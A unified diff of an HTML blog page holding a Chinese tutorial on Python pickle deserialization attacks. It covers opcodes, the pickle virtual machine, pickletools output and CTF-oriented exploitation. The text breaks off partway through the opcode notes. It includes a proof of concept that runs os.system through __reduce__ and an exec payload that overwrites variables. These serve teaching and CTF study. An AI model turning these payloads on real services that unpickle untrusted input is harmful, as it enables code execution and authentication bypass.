@@ -5,18 +5,18 @@
     
     <title>pickle反序列化初探 | Math &amp; Sec ，HACHp1的个人博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="pickle反序列化初探 本文首发于先知社区，链接：https://xz.aliyun.com/t/7436   pickle反序列化初探  前言 基本知识  pickle简介 可序列化的对象 object.__reduce__() 函数  pickle过程详细解读  opcode简介  opcode版本  pickletools  漏洞利用  利用思">
+    <meta name="description" content="pickle反序列化初探本文首发于先知社区，链接：https://xz.aliyun.com/t/7436   pickle反序列化初探 前言 基本知识 pickle简介 可序列化的对象 object.__reduce__() 函数   pickle过程详细解读 opcode简介 opcode版本   pickletools   漏洞利用 利用思路 初步认识：pickle EXP的简单demo 如">
 <meta name="keywords" content="Web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pickle反序列化初探">
 <meta property="og:url" content="https://hachp1.github.io/posts/Web安全/20200328-pickle.html">
 <meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
-<meta property="og:description" content="pickle反序列化初探 本文首发于先知社区，链接：https://xz.aliyun.com/t/7436   pickle反序列化初探  前言 基本知识  pickle简介 可序列化的对象 object.__reduce__() 函数  pickle过程详细解读  opcode简介  opcode版本  pickletools  漏洞利用  利用思">
+<meta property="og:description" content="pickle反序列化初探本文首发于先知社区，链接：https://xz.aliyun.com/t/7436   pickle反序列化初探 前言 基本知识 pickle简介 可序列化的对象 object.__reduce__() 函数   pickle过程详细解读 opcode简介 opcode版本   pickletools   漏洞利用 利用思路 初步认识：pickle EXP的简单demo 如">
 <meta property="og:image" content="http://159.75.52.53/img/thumbnails/planet_red.png">
 <meta property="og:updated_time" content="2021-10-29T11:39:31.650Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pickle反序列化初探">
-<meta name="twitter:description" content="pickle反序列化初探 本文首发于先知社区，链接：https://xz.aliyun.com/t/7436   pickle反序列化初探  前言 基本知识  pickle简介 可序列化的对象 object.__reduce__() 函数  pickle过程详细解读  opcode简介  opcode版本  pickletools  漏洞利用  利用思">
+<meta name="twitter:description" content="pickle反序列化初探本文首发于先知社区，链接：https://xz.aliyun.com/t/7436   pickle反序列化初探 前言 基本知识 pickle简介 可序列化的对象 object.__reduce__() 函数   pickle过程详细解读 opcode简介 opcode版本   pickletools   漏洞利用 利用思路 初步认识：pickle EXP的简单demo 如">
 <meta name="twitter:image" content="http://159.75.52.53/img/thumbnails/planet_red.png">
     
 
@@ -246,33 +246,29 @@
         <div class="article-entry" itemprop="articleBody">
         
             
-			<h1 id="pickle反序列化初探">pickle反序列化初探</h1>
-<p>本文首发于先知社区，链接：<a href="https://xz.aliyun.com/t/7436" class="uri" target="_blank" rel="external">https://xz.aliyun.com/t/7436</a></p>
+			<h1 id="pickle反序列化初探"><a href="#pickle反序列化初探" class="headerlink" title="pickle反序列化初探"></a>pickle反序列化初探</h1><p>本文首发于先知社区，链接：<a href="https://xz.aliyun.com/t/7436" target="_blank" rel="external">https://xz.aliyun.com/t/7436</a></p>
 <!-- TOC -->
 <ul>
-<li><a href="#pickle反序列化初探">pickle反序列化初探</a>
-<ul>
+<li><a href="#pickle反序列化初探">pickle反序列化初探</a><ul>
 <li><a href="#前言">前言</a></li>
-<li><a href="#基本知识">基本知识</a>
-<ul>
+<li><a href="#基本知识">基本知识</a><ul>
 <li><a href="#pickle简介">pickle简介</a></li>
 <li><a href="#可序列化的对象">可序列化的对象</a></li>
 <li><a href="#object__reduce__-函数"><code>object.__reduce__()</code> 函数</a></li>
-</ul></li>
-<li><a href="#pickle过程详细解读">pickle过程详细解读</a>
-<ul>
-<li><a href="#opcode简介">opcode简介</a>
-<ul>
+</ul>
+</li>
+<li><a href="#pickle过程详细解读">pickle过程详细解读</a><ul>
+<li><a href="#opcode简介">opcode简介</a><ul>
 <li><a href="#opcode版本">opcode版本</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href="#pickletools">pickletools</a></li>
-</ul></li>
-<li><a href="#漏洞利用">漏洞利用</a>
-<ul>
+</ul>
+</li>
+<li><a href="#漏洞利用">漏洞利用</a><ul>
 <li><a href="#利用思路">利用思路</a></li>
 <li><a href="#初步认识pickle-exp的简单demo">初步认识：pickle EXP的简单demo</a></li>
-<li><a href="#如何手写opcode">如何手写opcode</a>
-<ul>
+<li><a href="#如何手写opcode">如何手写opcode</a><ul>
 <li><a href="#常用opcode解析">常用opcode解析</a></li>
 <li><a href="#拼接opcode">拼接opcode</a></li>
 <li><a href="#全局变量覆盖">全局变量覆盖</a></li>
@@ -280,28 +276,28 @@
 <li><a href="#实例化对象">实例化对象</a></li>
 <li><a href="#pker的使用推荐">pker的使用（推荐）</a></li>
 <li><a href="#注意事项">注意事项</a></li>
-</ul></li>
-<li><a href="#ctf实战">CTF实战</a>
-<ul>
+</ul>
+</li>
+<li><a href="#ctf实战">CTF实战</a><ul>
 <li><a href="#做题之前了解pickleunpicklerfind_class">做题之前：了解<code>pickle.Unpickler.find_class()</code></a></li>
 <li><a href="#code-breakingpicklecode">Code-Breaking:picklecode</a></li>
 <li><a href="#watevrctf-2019pickle-store">watevrCTF-2019:Pickle Store</a></li>
 <li><a href="#高校战疫网络安全分享赛webtmp">高校战疫网络安全分享赛:webtmp</a></li>
-</ul></li>
-</ul></li>
-<li><a href="#pker使用说明">pker使用说明</a>
-<ul>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#pker使用说明">pker使用说明</a><ul>
 <li><a href="#简介">简介</a></li>
 <li><a href="#pker能做的事">pker能做的事</a></li>
-<li><a href="#使用方法与示例">使用方法与示例</a>
-<ul>
+<li><a href="#使用方法与示例">使用方法与示例</a><ul>
 <li><a href="#pker全局变量覆盖">pker：全局变量覆盖</a></li>
 <li><a href="#pker函数执行">pker：函数执行</a></li>
 <li><a href="#pker实例化对象">pker：实例化对象</a></li>
 <li><a href="#手动辅助">手动辅助</a></li>
-</ul></li>
-<li><a href="#pkerctf实战">pker：CTF实战</a>
-<ul>
+</ul>
+</li>
+<li><a href="#pkerctf实战">pker：CTF实战</a><ul>
 <li><a href="#code-breaking-picklecode">Code-Breaking: picklecode</a></li>
 <li><a href="#balsnctfpyshv1">BalsnCTF:pyshv1</a></li>
 <li><a href="#balsnctfpyshv2">BalsnCTF:pyshv2</a></li>
@@ -309,27 +305,26 @@
 <li><a href="#watevrctf-2019-pickle-store">watevrCTF-2019: Pickle Store</a></li>
 <li><a href="#suctf-2019guess_game">SUCTF-2019:guess_game</a></li>
 <li><a href="#高校战疫网络安全分享赛-webtmp">高校战疫网络安全分享赛: webtmp</a></li>
-</ul></li>
-</ul></li>
+</ul>
+</li>
+</ul>
+</li>
 <li><a href="#后记">后记</a></li>
 <li><a href="#参考资料">参考资料</a></li>
-</ul></li>
+</ul>
+</li>
 </ul>
 <!-- /TOC -->
 <a id="more"></a>
-<h2 id="前言">前言</h2>
-<p>最近遇到有关pickle的CTF题，虽然被很多师傅们玩的差不多了，但是我也仔细学习了一波，尽可能详细地总结了pickle反序列化的相关知识。整篇文章介绍了pickle的基本原理、PVM、opcode解析的详细过程、CTF赛题实战和pker工具的使用，希望这篇文章能给初学pickle反序列化知识的童鞋带来帮助。文章内容比较多，如果文章中出现了错误请师傅们指正。</p>
-<h2 id="基本知识">基本知识</h2>
-<h3 id="pickle简介">pickle简介</h3>
-<ul>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近遇到有关pickle的CTF题，虽然被很多师傅们玩的差不多了，但是我也仔细学习了一波，尽可能详细地总结了pickle反序列化的相关知识。整篇文章介绍了pickle的基本原理、PVM、opcode解析的详细过程、CTF赛题实战和pker工具的使用，希望这篇文章能给初学pickle反序列化知识的童鞋带来帮助。文章内容比较多，如果文章中出现了错误请师傅们指正。</p>
+<h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h3 id="pickle简介"><a href="#pickle简介" class="headerlink" title="pickle简介"></a>pickle简介</h3><ul>
 <li>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。</li>
 <li>python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。</li>
 <li>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。</li>
 <li>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</li>
 </ul>
-<h3 id="可序列化的对象">可序列化的对象</h3>
-<ul>
-<li><code>None</code> 、 <code>True</code> 和 <code>False</code></li>
+<h3 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a>可序列化的对象</h3><ul>
+<li><code>None</code> 、 <code>True</code> 和 <code>False</code> </li>
 <li>整数、浮点数、复数</li>
 <li>str、byte、bytearray</li>
 <li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li>
@@ -338,17 +333,15 @@
 <li>定义在模块最外层的类</li>
 <li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</li>
 </ul>
-<h3 id="object.__reduce__-函数"><code>object.__reduce__()</code> 函数</h3>
-<ul>
+<h3 id="object-reduce-函数"><a href="#object-reduce-函数" class="headerlink" title="object.__reduce__() 函数"></a><code>object.__reduce__()</code> 函数</h3><ul>
 <li>在开发时，可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 <code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</li>
 <li>在下文pickle的opcode中， <code>R</code> 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 <code>R</code> 正好对应 <code>object.__reduce__()</code> 函数， <code>object.__reduce__()</code> 的返回值会作为 <code>R</code> 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 <code>R</code> 的。</li>
 </ul>
-<h2 id="pickle过程详细解读">pickle过程详细解读</h2>
-<ul>
+<h2 id="pickle过程详细解读"><a href="#pickle过程详细解读" class="headerlink" title="pickle过程详细解读"></a>pickle过程详细解读</h2><ul>
 <li>pickle解析依靠Pickle Virtual Machine (PVM)进行。</li>
 <li>PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存：</li>
 </ul>
-<ol type="1">
+<ol>
 <li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 停止。最终留在栈顶的值将被作为反序列化对象返回。</li>
 <li>栈：由Python的list实现，被用来临时存储数据、参数以及对象。</li>
 <li>memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 <code>key-value</code> 的形式储存在memo中，以便后来使用。</li>
@@ -356,18 +349,12 @@
 <ul>
 <li>为了便于理解，我把BH讲稿中的相关部分制成了动图，PVM解析 <code>str</code> 的过程动图：</li>
 </ul>
-<figure>
-<img src="http://159.75.52.53/img/blogimg/pickle1/str_pickle.gif" alt="PVM解析str的过程"><figcaption>PVM解析str的过程</figcaption>
-</figure>
+<p><img src="http://159.75.52.53/img/blogimg/pickle1/str_pickle.gif" alt="PVM解析str的过程"></p>
 <ul>
 <li>PVM解析 <code>__reduce__()</code> 的过程动图：</li>
 </ul>
-<figure>
-<img src="http://159.75.52.53/img/blogimg/pickle1/reduce_pickle.gif" alt="PVM解析__reduce__()的过程"><figcaption>PVM解析__reduce__()的过程</figcaption>
-</figure>
-<h3 id="opcode简介">opcode简介</h3>
-<h4 id="opcode版本">opcode版本</h4>
-<ul>
+<p><img src="http://159.75.52.53/img/blogimg/pickle1/reduce_pickle.gif" alt="PVM解析__reduce__()的过程"></p>
+<h3 id="opcode简介"><a href="#opcode简介" class="headerlink" title="opcode简介"></a>opcode简介</h3><h4 id="opcode版本"><a href="#opcode版本" class="headerlink" title="opcode版本"></a>opcode版本</h4><ul>
 <li>pickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本。</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pickle</div><div class="line"></div><div class="line">a=&#123;<span class="string">'1'</span>: <span class="number">1</span>, <span class="string">'2'</span>: <span class="number">2</span>&#125;</div><div class="line"></div><div class="line">print(<span class="string">f'# 原变量：<span class="subst">&#123;a!r&#125;</span>'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">    print(<span class="string">f'pickle版本<span class="subst">&#123;i&#125;</span>'</span>,pickle.dumps(a,protocol=i))</div><div class="line"></div><div class="line"><span class="comment"># 输出：</span></div><div class="line">pickle版本<span class="number">0</span> <span class="string">b'(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.'</span></div><div class="line">pickle版本<span class="number">1</span> <span class="string">b'&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'</span></div><div class="line">pickle版本<span class="number">2</span> <span class="string">b'\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'</span></div><div class="line">pickle版本<span class="number">3</span> <span class="string">b'\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'</span></div></pre></td></tr></table></figure>
@@ -380,7 +367,7 @@
 </ul>
 <table>
 <thead>
-<tr class="header">
+<tr>
 <th>Opcode</th>
 <th>Mnemonic</th>
 <th>Data type loaded onto the stack</th>
@@ -388,59 +375,59 @@
 </tr>
 </thead>
 <tbody>
-<tr class="odd">
+<tr>
 <td>S</td>
 <td>STRING</td>
 <td>String</td>
-<td>S’foo’</td>
+<td>S’foo’\n</td>
+</tr>
+<tr>
+<td>V</td>
+<td>UNICODE</td>
+<td>Unicode</td>
+<td>Vfo\u006f\n</td>
+</tr>
+<tr>
+<td>I</td>
+<td>INTEGER</td>
+<td>Integer</td>
+<td>I42\n</td>
+</tr>
+<tr>
+<td>…</td>
+<td>…</td>
+<td>…</td>
+<td>…</td>
 </tr>
 </tbody>
 </table>
-<div class="line-block">V | UNICODE | Unicode | Vfo<br>
-I | INTEGER | Integer | I42|<br>
-… | … | … | … |</div>
 <ul>
 <li>本表格截取了BH的pdf上的部分内容，完整表格可以直接在<a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="external">原pdf</a>中找到。</li>
 </ul>
-<h3 id="pickletools">pickletools</h3>
-<ul>
+<h3 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h3><ul>
 <li>使用pickletools可以方便的将opcode转化为便于肉眼读取的形式</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pickletools</div><div class="line"></div><div class="line">data=<span class="string">b"\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1=b'1'\nkey2=b'2'q\x01\x85q\x02Rq\x03."</span></div><div class="line">pickletools.dis(data)</div><div class="line"></div><div class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></div><div class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">'builtins exec'</span></div><div class="line">   <span class="number">17</span>: q    BINPUT     <span class="number">0</span></div><div class="line">   <span class="number">19</span>: X    BINUNICODE <span class="string">"key1=b'1'\nkey2=b'2'"</span></div><div class="line">   <span class="number">43</span>: q    BINPUT     <span class="number">1</span></div><div class="line">   <span class="number">45</span>: \x85 TUPLE1</div><div class="line">   <span class="number">46</span>: q    BINPUT     <span class="number">2</span></div><div class="line">   <span class="number">48</span>: R    REDUCE</div><div class="line">   <span class="number">49</span>: q    BINPUT     <span class="number">3</span></div><div class="line">   <span class="number">51</span>: .    STOP</div><div class="line">highest protocol among opcodes = <span class="number">2</span></div></pre></td></tr></table></figure>
-<h2 id="漏洞利用">漏洞利用</h2>
-<h3 id="利用思路">利用思路</h3>
-<ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
 <li>任意代码执行或命令执行。</li>
 <li>变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。</li>
 </ul>
-<h3 id="初步认识pickle-exp的简单demo">初步认识：pickle EXP的简单demo</h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pickle</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">genpoc</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></div><div class="line">        s = <span class="string">"""echo test &gt;poc.txt"""</span>  <span class="comment"># 要执行的命令</span></div><div class="line">        <span class="keyword">return</span> os.system, (s,)        <span class="comment"># reduce函数必须返回元组或字符串</span></div><div class="line"></div><div class="line">e = genpoc()</div><div class="line">poc = pickle.dumps(e)</div><div class="line"></div><div class="line">print(poc) <span class="comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span></div></pre></td></tr></table></figure>
+<h3 id="初步认识：pickle-EXP的简单demo"><a href="#初步认识：pickle-EXP的简单demo" class="headerlink" title="初步认识：pickle EXP的简单demo"></a>初步认识：pickle EXP的简单demo</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pickle</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">genpoc</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></div><div class="line">        s = <span class="string">"""echo test &gt;poc.txt"""</span>  <span class="comment"># 要执行的命令</span></div><div class="line">        <span class="keyword">return</span> os.system, (s,)        <span class="comment"># reduce函数必须返回元组或字符串</span></div><div class="line"></div><div class="line">e = genpoc()</div><div class="line">poc = pickle.dumps(e)</div><div class="line"></div><div class="line">print(poc) <span class="comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span></div></pre></td></tr></table></figure>
 <ul>
 <li>变量覆盖</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pickle</div><div class="line"></div><div class="line">key1 = <span class="string">b'321'</span></div><div class="line">key2 = <span class="string">b'123'</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> (<span class="keyword">exec</span>,(<span class="string">"key1=b'1'\nkey2=b'2'"</span>,))</div><div class="line"></div><div class="line">a = A()</div><div class="line">pickle_a = pickle.dumps(a)</div><div class="line">print(pickle_a)</div><div class="line">pickle.loads(pickle_a)</div><div class="line">print(key1, key2)</div></pre></td></tr></table></figure>
-<h3 id="如何手写opcode">如何手写opcode</h3>
-<ul>
+<h3 id="如何手写opcode"><a href="#如何手写opcode" class="headerlink" title="如何手写opcode"></a>如何手写opcode</h3><ul>
 <li>在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 <code>__reduce__</code> 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。</li>
 <li>在这里可以体会到为何pickle<strong>是一种语言</strong>，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。</li>
 <li>根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。下文中，所有opcode为版本0的opcode。</li>
 </ul>
-<h4 id="常用opcode解析">常用opcode解析</h4>
-<p>为了充分理解栈的作用，强烈建议一边看动图一边学习opcode的作用：</p>
-<figure>
-<img src="http://159.75.52.53/img/blogimg/pickle1/reduce_pickle.gif" alt="PVM解析__reduce__()的过程"><figcaption>PVM解析__reduce__()的过程</figcaption>
-</figure>
+<h4 id="常用opcode解析"><a href="#常用opcode解析" class="headerlink" title="常用opcode解析"></a>常用opcode解析</h4><p>为了充分理解栈的作用，强烈建议一边看动图一边学习opcode的作用：</p>
+<p><img src="http://159.75.52.53/img/blogimg/pickle1/reduce_pickle.gif" alt="PVM解析__reduce__()的过程"></p>
 <p>由于pickle库中的注释不是很详细，网上的其他资料也没有具体地把栈和memo上的变化讲清楚，以下的每个opcode的操作都是我经过实验验证并且尽可能将栈和memo上的变化解释清楚，常用的opcode如下：</p>
-<table style="width:100%;">
-<colgroup>
-<col style="width: 3%">
-<col style="width: 48%">
-<col style="width: 19%">
-<col style="width: 22%">
-<col style="width: 5%">
-</colgroup>
+<table>
 <thead>
-<tr class="header">
+<tr>
 <th>opcode</th>
 <th>描述</th>
 <th>具体写法</th>
@@ -449,175 +436,175 @@ I | INTEGER | Integer | I42|<br>
 </tr>
 </thead>
 <tbody>
-<tr class="odd">
+<tr>
 <td>c</td>
 <td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
-<td>c[module]</td>
+<td>c[module]\n[instance]\n</td>
 <td>获得的对象入栈</td>
 <td>无</td>
 </tr>
-<tr class="even">
+<tr>
 <td>o</td>
 <td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
 <td>o</td>
 <td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
 <td>无</td>
 </tr>
-<tr class="odd">
+<tr>
 <td>i</td>
 <td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
-<td>i[module]</td>
+<td>i[module]\n[callable]\n</td>
 <td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
 <td>无</td>
 </tr>
-<tr class="even">
+<tr>
 <td>N</td>
 <td>实例化一个None</td>
 <td>N</td>
 <td>获得的对象入栈</td>
 <td>无</td>
 </tr>
-<tr class="odd">
+<tr>
 <td>S</td>
 <td>实例化一个字符串对象</td>
-<td>S’xxx’（也可以使用双引号、\’等python字符串形式）</td>
+<td>S’xxx’\n（也可以使用双引号、\‘等python字符串形式）</td>
 <td>获得的对象入栈</td>
 <td>无</td>
 </tr>
-<tr class="even">
+<tr>
 <td>V</td>
 <td>实例化一个UNICODE字符串对象</td>
-<td>Vxxx</td>
+<td>Vxxx\n</td>
 <td>获得的对象入栈</td>
 <td>无</td>
 </tr>
-<tr class="odd">
+<tr>
 <td>I</td>
 <td>实例化一个int对象</td>
-<td>Ixxx</td>
+<td>Ixxx\n</td>
 <td>获得的对象入栈</td>
 <td>无</td>
 </tr>
-<tr class="even">
+<tr>
 <td>F</td>
 <td>实例化一个float对象</td>
-<td>Fx.x</td>
+<td>Fx.x\n</td>
 <td>获得的对象入栈</td>
 <td>无</td>
 </tr>
-<tr class="odd">
+<tr>
 <td>R</td>
 <td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
 <td>R</td>
 <td>函数和参数出栈，函数的返回值入栈</td>
 <td>无</td>
 </tr>
-<tr class="even">
+<tr>
 <td>.</td>
 <td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
 <td>.</td>
 <td>无</td>
 <td>无</td>
 </tr>
-<tr class="odd">
+<tr>
 <td>(</td>
 <td>向栈中压入一个MARK标记</td>
 <td>(</td>
 <td>MARK标记入栈</td>
 <td>无</td>
 </tr>
-<tr class="even">
+<tr>
 <td>t</td>
 <td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
 <td>t</td>
 <td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
 <td>无</td>
 </tr>
-<tr class="odd">
+<tr>
 <td>)</td>
 <td>向栈中直接压入一个空元组</td>
 <td>)</td>
 <td>空元组入栈</td>
 <td>无</td>
 </tr>
-<tr class="even">
+<tr>
 <td>l</td>
 <td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
 <td>l</td>
 <td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
 <td>无</td>
 </tr>
-<tr class="odd">
+<tr>
 <td>]</td>
 <td>向栈中直接压入一个空列表</td>
 <td>]</td>
 <td>空列表入栈</td>
 <td>无</td>
 </tr>
-<tr class="even">
+<tr>
 <td>d</td>
 <td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
 <td>d</td>
 <td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
 <td>无</td>
 </tr>
-<tr class="odd">
+<tr>
 <td>}</td>
 <td>向栈中直接压入一个空字典</td>
 <td>}</td>
 <td>空字典入栈</td>
 <td>无</td>
 </tr>
-<tr class="even">
+<tr>
 <td>p</td>
 <td>将栈顶对象储存至memo_n</td>
-<td>pn</td>
+<td>pn\n</td>
 <td>无</td>
 <td>对象被储存</td>
 </tr>
-<tr class="odd">
+<tr>
 <td>g</td>
 <td>将memo_n的对象压栈</td>
-<td>gn</td>
+<td>gn\n</td>
 <td>对象被压栈</td>
 <td>无</td>
 </tr>
-<tr class="even">
+<tr>
 <td>0</td>
 <td>丢弃栈顶对象</td>
 <td>0</td>
 <td>栈顶对象被丢弃</td>
 <td>无</td>
 </tr>
-<tr class="odd">
+<tr>
 <td>b</td>
 <td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
 <td>b</td>
 <td>栈上第一个元素出栈</td>
 <td>无</td>
 </tr>
-<tr class="even">
+<tr>
 <td>s</td>
 <td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
 <td>s</td>
 <td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
 <td>无</td>
 </tr>
-<tr class="odd">
+<tr>
 <td>u</td>
 <td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
 <td>u</td>
 <td>MARK标记以及被组合的数据出栈，字典被更新</td>
 <td>无</td>
 </tr>
-<tr class="even">
+<tr>
 <td>a</td>
 <td>将栈的第一个元素append到第二个元素(列表)中</td>
 <td>a</td>
 <td>栈顶元素出栈，第二个元素（列表）被更新</td>
 <td>无</td>
 </tr>
-<tr class="odd">
+<tr>
 <td>e</td>
 <td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
 <td>e</td>
@@ -626,8 +613,7 @@ I | INTEGER | Integer | I42|<br>
 </tr>
 </tbody>
 </table>
-<p>此外， <code>TRUE</code> 可以用 <code>I</code> 表示： <code>b'I01\n'</code> ； <code>FALSE</code> 也可以用 <code>I</code> 表示： <code>b'I00\n'</code> ，其他opcode可以在<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111" target="_blank" rel="external">pickle库的源代码</a>中找到。<br>
-由这些opcode我们可以得到一些需要注意的地方：</p>
+<p>此外， <code>TRUE</code> 可以用 <code>I</code> 表示： <code>b&#39;I01\n&#39;</code> ； <code>FALSE</code> 也可以用 <code>I</code> 表示： <code>b&#39;I00\n&#39;</code> ，其他opcode可以在<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111" target="_blank" rel="external">pickle库的源代码</a>中找到。<br>由这些opcode我们可以得到一些需要注意的地方：</p>
 <ul>
 <li>编写opcode时要想象栈中的数据，以正确使用每种opcode。</li>
 <li>在理解时注意与python本身的操作对照（比如python列表的<code>append</code>对应<code>a</code>、<code>extend</code>对应<code>e</code>；字典的<code>update</code>对应<code>u</code>）。</li>
@@ -635,85 +621,69 @@ I | INTEGER | Integer | I42|<br>
